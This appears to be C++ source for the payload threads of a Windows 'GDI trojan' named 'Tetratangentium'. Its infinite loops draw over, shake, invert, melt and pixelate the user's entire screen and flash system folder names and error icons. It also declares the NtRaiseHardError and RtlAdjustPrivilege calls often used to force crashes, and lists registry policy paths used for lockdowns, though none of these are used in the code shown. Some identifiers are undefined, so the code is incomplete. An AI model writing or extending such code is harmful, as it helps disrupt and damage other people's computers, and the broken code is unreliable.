#include <windows.h>



EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, PBYTE);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, DWORD, DWORD, PDWORD_PTR, DWORD, PDWORD);

// char values
const wchar_t* regPathSystem = L"SOFTWARE\\Microsoft\\Windows\\Policies\\CurrentVersion\\SYSTEM"; const wchar_t*  regPathExplorer = L"SOFTWARE\\Microsoft\\Windows\\Policies\\CurrentVersion\\EXPLORER";

const wchar_t* StrGen(int str) {
    LPWSTR string = new WCHAR[str + 1];
    for (int ex = 0; ex < str; ex++) {
        string[ex] = rand() % 492 + 20; // cycles through space and character 511 (?)
    }
    string[str] = L'\0';
    return string;
}



namespace GDI {
	DWORD WINAPI GocullinatorCircle(LPVOID pvoid) {
	    HDC hdc = GetDC(0);
	
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	    while (true) {
	        POINT cpt;
	        GetCursorPos(&cpt);
	        HBRUSH hbsh = CreateSolidBrush(crSpectrum(fclr));
	        SelectObject(hdc, hbsh);
	        Ellipse(hdc, cpt.x + 50, cpt.y + 50, cpt.x - 50, cpt.y - 50);
	        Ellipse(hdc, cpt.x + 45, cpt.y + 45, cpt.x - 45, cpt.y - 45);
	        Ellipse(hdc, cpt.x + 40, cpt.y + 40, cpt.x - 40, cpt.y - 40);
	        Ellipse(hdc, cpt.x + 35, cpt.y + 35, cpt.x - 35, cpt.y - 35);
	        Ellipse(hdc, cpt.x + 30, cpt.y + 30, cpt.x - 30, cpt.y - 30);
	        Ellipse(hdc, cpt.x + 25, cpt.y + 25, cpt.x - 25, cpt.y - 25);
	        Ellipse(hdc, cpt.x + 20, cpt.y + 20, cpt.x - 20, cpt.y - 20);
	        Ellipse(hdc, cpt.x + 15, cpt.y + 15, cpt.x - 15, cpt.y - 15);
	        Ellipse(hdc, cpt.x + 10, cpt.y + 10, cpt.x - 10, cpt.y - 10);
	        fclr += M_PI / 3;
	        DeleteObject(hbsh);
	        Sleep(10);
	    }
	}
	
	DWORD WINAPI noteraseshake(LPVOID pvoid)
	{
		HDC hdc;
		HBRUSH hbsh;
		while (true) {
			hdc = GetDC(0);
			hbsh = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(hdc, hbsh);
			BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTMERGEERASE);
			DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI plgblt(LPVOID pvoid)
	{
	    HDC hdc;
	    RECT rct;
	    HWND hwnd = GetDesktopWindow();
	    while (true) {
	        hdc = GetDC(0);
	    
	        GetWindowRect(hwnd, &rct);
	        POINT lpt[3];
	        // left, top, right, top, left, bottom
	        lpt[0].x = rct.left + 20; lpt[0].y = rct.top + 15;
	        lpt[1].x = rct.right;       lpt[1].y = rct.top - 30;
	        lpt[2].x = rct.left - 15; lpt[2].y = rct.bottom - 2;
	        // left, top, right-left, bottom-top
	        PlgBlt(hdc, lpt, hdc, rct.left, rct.top, rct.right-rct.left, rct.bottom-rct.top, NULL, 0, 0);
	        ReleaseDC(0, hdc);
	        Sleep(10);
	    }
	}
	
	DWORD WINAPI HSLTriangles(LPVOID pvoid)
	{
		HDC hdc;
		while (true) {
			hdc = GetDC(0);
			HBRUSH hbsh = CreateSolidBrush(crSpectrum(fclr));
			HPEN hp = CreatePen(PS_SOLID, 1, crSpectrum(fclr));
			POINT tpt[] = {{rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h}};
			SelectObject(hdc, hbsh);
			SelectObject(hdc, hp);
			Polygon(hdc, tpt, sizeof(tpt)/sizeof(tpt[0]));
			fclr += M_PI / 3;
			DeleteObject(hp); DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI SharpShake(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			SetStretchBltMode(hdc, STRETCH_HALFTONE);
			BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, SRCCOPY);
			StretchBlt(hdc, 0, 0, w-2, h-2, hdc, 0, 0, w, h, SRCCOPY);
			StretchBlt(hdc, 0, 0, w+2, h+2, hdc, 0, 0, w, h, SRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI BouncingTriangle(LPVOID pvoid)
	{
		HDC hdc;
		HBRUSH hbsh;
		int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
		int incrementation = 10;
		int x = 10, y = 10;
		while (1) {
			hdc = GetDC(0);
			x += incrementation * sx;
			y += incrementation * sy;
			POINT vpt[] = {{x+180, y+90}, {x+90, y+90}, {x+90, y+45}};
			hbsh = CreateSolidBrush(crSpectrum(fclr));
			SelectObject(hdc, hbsh);
			Polygon(hdc, vpt, sizeof(vpt)/sizeof(vpt[0]));
			if (y >= GetSystemMetrics(1)) {
				sy = -1;
			}
			if (x >= GetSystemMetrics(0)) {
				sx = -1;
			}
			if (y == 0) {
				sy = 1;
			}
			if (x == 0) {
				sx = 1;
			}
			fclr += M_PI / 3;
			DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI HorizontalMelt(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			int rw = rand() % w, rh = rand() % h;
			BitBlt(hdc, rand() % 5 - 2, rh, w, 100, hdc, 0, rh, (rand() % 2)?SRCPAINT:SRCAND);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI WhiteEllipses(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			int rw = rand() % w, rh = rand() % h;
			Ellipse(hdc, rw, rh, rw+rand() % 100, rh+100);
			ReleaseDC(0, hdc);
			Sleep(400);
		}
	}
	
	DWORD WINAPI PTrgbQuad(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
			BITMAPINFO bmp = { {sizeof(BITMAPINFO), w, h, 1, 32}, 0};
			PTRGBQUAD ptrq;
			HBITMAP hbmp = CreateDIBSection(hdc, &bmp, 0, (VOID**)&ptrq, NULL, 0);
			SelectObject(mdc, hbmp);
			for (;;) {
				BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
				for (int k = 0; k < w * h; k++) {
					int x = k % w, y = k / h;
					ptrq[k].red += 5;
					ptrq[k].green *= 5;
					ptrq[k].blue ^= 360;
				}
				BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
				Sleep(10);
			}
		}
	}
	
	DWORD WINAPI RainbowTexts(LPVOID lpvd)
	{
		while (true) {
			HDC hdc = GetDC(0);
			HFONT hfnt = CreateFontA(rand() % 100, 0, 0, 0, FW_MEDIUM, false, false, false, ANSI_CHARSET, 0, 0, 0, 0, "Arial");
			SetBkMode(hdc, 0);
			SetTextColor(hdc, crSpectrum(fclr));
			SelectObject(hdc, hfnt);
			TextOutA(hdc, rand() % w, rand() % h, "Tetratangentium", 15);
			fclr += M_PI;
			DeleteObject(hfnt);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI PatHSLOverdose(LPVOID pvoid)
		{
		while (true) {
			HDC hdc = GetDC(0);
			HBRUSH hbsh = CreateSolidBrush(crSpectrum(fclr));
			SelectObject(hdc, hbsh);
			BitBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, PATPAINT);
			fclr += M_PI_2;
			DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI CirclShake(LPVOID pvoid)
		{
	    HDC hdc;
	    double angle = 0.0;
	    int xadd, yadd; // x angle and y angle
	    while (1) {
	        hdc = GetDC(NULL);
	        xadd = cos(angle) * 10, yadd = sin(angle) * 10;
	        BitBlt(hdc, xadd, yadd, w, h, hdc, 0, 0, SRCCOPY);
	        angle += M_PI / 8;
	        ReleaseDC(NULL, hdc);
	        Sleep(10);
	    }
	}
	
	DWORD WINAPI Pixelator(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
			HBITMAP hbit2 = CreateCompatibleBitmap(hdc, w, h);
			SelectObject(mdc, hbit2);
			SetStretchBltMode(hdc, COLORONCOLOR); SetStretchBltMode(mdc, COLORONCOLOR);
			StretchBlt(mdc, 0, 0, w/10, h/10, hdc, 0, 0, w, h, SRCCOPY);
			StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, w/10, h/10, SRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI BounceCirclePoint(LPVOID pvoid)
	{
		HDC hdc;
		HBRUSH hbsh;
		int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
		int incrementation = 10;
		int x = 10, y = 10;
		while (1) {
			hdc = GetDC(0);
			x += incrementation * sx;
			y += incrementation * sy;
			hbsh = CreateSolidBrush(crSpectrum(fclr));
			SelectObject(hdc, hbsh);
			Ellipse(hdc, x, y, x+100, y+100);
			SelectObject(hdc, GetStockObject(NULL_BRUSH));
			HBRUSH hbsh2 = CreateSolidBrush(RGB(0, 0, 0));
			SelectObject(hdc, hbsh2);
			Ellipse(hdc, x+50, y+50, x+70, y+70);
			DeleteObject(hbsh2);
			if (y >= GetSystemMetrics(1)) {
				sy = -1;
			}
			if (x >= GetSystemMetrics(0)) {
				sx = -1;
			}
			if (y == 0) {
				sy = 1;
			}
			if (x == 0) {
				sx = 1;
			}
			fclr += M_PI;
			DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI CubesTexts(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			LPCSTR WinDirs[] = {
				"assembly", "Boot",
				"Cursors", "debug",
				"Firmware", "Fonts",
				"oem", "Setup",
				"System32", "SysWOW64",
				"NotCCR", "TAPI",
				"Temp", "WinSxS"
			};
			int iWinDirCnt = rand() % 14;
			HFONT hfnt = CreateFontA(rand() % 150 + 1, 0, 0, 0, FW_EXTRALIGHT, false, false, false, ANSI_CHARSET, 0, 0, 0, 0, "Arial");
			SelectObject(hdc, hfnt);
			SetBkMode(hdc, 0);
			SetTextColor(hdc, crSpectrum(fclr));
			TextOutA(hdc, rand() % w, rand() % h, WinDirs[iWinDirCnt], strlen(WinDirs[iWinDirCnt]));
			SetStretchBltMode(hdc, STRETCH_HALFTONE);
			StretchBlt(hdc, -5, -5, w+10, h+10, hdc, 0, 0, w, h, SRCCOPY);
			StretchBlt(hdc, 5, 5, w-10, h-10, hdc, 0, 0, w, h, SRCCOPY);
			fclr += M_PI;
			DeleteObject(hfnt);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI Rotation(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			HWND hwnd = GetDesktopWindow();
			RECT rct;
			GetWindowRect(hwnd, &rct);
			POINT lpt[3];
			if (rand() % 2 == 0) {
				lpt[0].x = rct.left + 31; lpt[0].y = rct.top - 31;
				lpt[1].x = rct.right + 31; lpt[1].y = rct.top + 31;
				lpt[2].x = rct.left - 31; lpt[2].y = rct.bottom - 31;
				PlgBlt(hdc, lpt, hdc, rct.left, rct.top, rct.right-rct.left, rct.bottom-rct.top, NULL, 0, 0);
			}
			else if (rand() % 2 == 1) {
				lpt[0].x = rct.left - 50; lpt[0].y = rct.top + 50;
				lpt[1].x = rct.right - 50; lpt[1].y = rct.top - 50;
				lpt[2].x = rct.left + 50; lpt[2].y = rct.bottom + 50;
				PlgBlt(hdc, lpt, hdc, rct.left, rct.top, rct.right-rct.left, rct.bottom-rct.top, NULL, 0, 0);
			}
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI ClrRectangles(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			int rw = rand() % w, rh = rand() % h;
			HRGN hrgn = CreateRectRgn(rw, rh, 100+rw, 100+rh);
			HBRUSH hbsh = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(hdc, hbsh);
			SelectClipRgn(hdc, hrgn);
			BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
			DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI SetShake(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			BitBlt(hdc, rand() % 25, rand() % 25, w, h, hdc, rand() % 25, rand() % 25, SRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI PatIcons(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			HBRUSH hbsh = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(hdc, hbsh);
			LPCSTR Icons[] = {IDI_ERROR, IDI_QUESTION, IDI_APPLICATION, IDI_WARNING, IDI_ASTERISK};
			int iIcons = rand() % 5;
			const char* Index = Icons[iIcons];
			int w2 = GetSystemMetrics(SM_CXICON), h2 = GetSystemMetrics(SM_CYICON);
			DrawIconEx(hdc, rand() % w, rand() % h, LoadIconA(NULL, Index), rand() % 5 * w2, rand() % 5 * h2, 0, NULL, DI_NORMAL);
			PatBlt(hdc, 0, 0, w, h, PATINVERT);
			DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
}
